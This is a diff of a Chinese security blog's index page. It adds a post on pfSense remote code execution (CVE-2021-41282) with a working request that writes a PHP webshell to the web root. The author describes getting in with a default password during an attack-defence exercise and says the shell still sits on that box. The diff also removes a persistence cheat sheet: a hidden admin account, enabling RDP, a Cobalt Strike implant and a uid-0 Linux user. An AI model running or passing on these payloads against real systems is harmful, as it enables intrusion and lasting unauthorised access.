@@ -184,6 +184,90 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Pfsense.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Pfsense.html" class="post-title-link" itemprop="url">Pfsense</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-10-13 15:56:49" itemprop="dateCreated datePublished" datetime="2022-10-13T15:56:49+08:00">2022-10-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:43:50" itemprop="dateModified" datetime="2023-04-16T10:43:50+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/" itemprop="url" rel="index"><span itemprop="name">网络设备</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Pfsense-RCE-CVE-2021-41282">1. Pfsense RCE CVE-2021-41282</h1><p>前言:在2022国护的时候发现异常攻击流量，溯源时发现目标存在Pfsense防火墙，并用弱口令admin&#x2F;pfsense成功登录，之前写shell成功然后web被打崩了，今天偶尔发现这个web又重启了，虽然弱口令修复了，但是马没删。</p>
+<h2 id="影响版本">1.1. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pfSense CE version &lt;= 2.5.2</span><br><span class="line">pfSense Plush version &lt; 22.01</span><br></pre></td></tr></table></figure>
+
+<h2 id="前提条件">1.2. 前提条件:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该漏洞利用需要登录后台</span><br></pre></td></tr></table></figure>
+
+<h2 id="POC">1.3. POC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用该POC会在网站根目录写上a.php的木马，执行参数为a</span><br><span class="line">/diag_routes.php?isAjax=1&amp;filter=.*/!d;&#125;;s/Destination/\x3c\x3fphp+system($_GET[\x22a\x22])\x3b\x3f\x3e/;w+/usr/local/www/a.php%0a%23</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221011215541115.png" alt="image-20221011215541115"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221011215558684.png" alt="image-20221011215558684"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/Python/PythonGUI-wxpython.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -980,95 +1064,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="气温太低">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="qwtd-blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html" class="post-title-link" itemprop="url">权限维持</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-08-27 15:56:49" itemprop="dateCreated datePublished" datetime="2022-08-27T15:56:49+08:00">2022-08-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-08-29 17:09:52" itemprop="dateModified" datetime="2022-08-29T17:09:52+08:00">2022-08-29</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="权限维持">1. 权限维持</h1><h2 id="windows">1.1. windows</h2><h3 id="添加隐藏用户">1.1.1. 添加隐藏用户</h3><ol>
-<li><code>net user Guest01$ Aa123456. /add</code></li>
-<li><code>net user</code>查看用户，未发现<code>Guest01$</code>用户</li>
-<li>通过<code>计算机管理--&gt;本地用户和组--&gt;用户</code>  可以看到用户</li>
-</ol>
-<h3 id="开启远程桌面功能">1.1.2. 开启远程桌面功能</h3><ol>
-<li><p><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code> 开启3389远程桌面功能</p>
-</li>
-<li><p><code>net localgroup Administrators Guest01$ /add </code> 将Guest01$账号添加到管理员组，不然登录会出现没有权限</p>
-<p><img src="https://s2.loli.net/2022/08/15/e9g7Thxp6tVPvsd.png" alt="image-20220815150935477"></p>
-<p>3.CS木马上线，将木马进程注入到现有进程中。</p>
-</li>
-</ol>
-<h2 id="linux">1.2. linux</h2><h3 id="一句话新建用户，并加入管理员组">1.2.1. 一句话新建用户，并加入管理员组</h3><p><code>useradd -p openssl passwd -1 -salt &#39;qax&#39; qaxnb@123 -u 0 -g root -G root -s /bin/bash -d /usr/bin/qaxnb qaxnb</code></p>
-<p>（最后的qaxnb为账号,qaxnb@123为密码）</p>
-<p>添加ssh公钥</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1140,14 +1135,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-count">47</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">17</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
